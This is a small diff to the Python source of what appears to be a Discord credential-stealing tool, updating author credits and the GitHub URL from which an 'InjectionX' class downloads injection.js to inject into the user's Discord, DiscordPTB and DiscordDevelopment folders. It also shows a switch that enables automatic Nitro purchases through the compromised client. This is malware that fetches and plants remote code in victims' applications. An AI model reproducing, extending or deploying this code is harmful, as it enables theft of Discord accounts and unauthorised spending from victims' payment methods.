@@ -1,4 +1,4 @@
-# Modified by S1LKT0UCH#4888, but created by Smug246, so credits to him. :)
+# Modified by gumbobr0t and xpierroz, but created by Smug246/addidix, so credits to him. :)
 # https://github.com/Smug246
 
 from config import Config
@@ -19,7 +19,7 @@ class InjectionX:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js').text
+        self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/injection/injection.js').text
         if cc.get_nitro_auto_buy() is True:
             self.code = self.code.replace("auto_buy_nitro: false,", "auto_buy_nitro: true,")
 
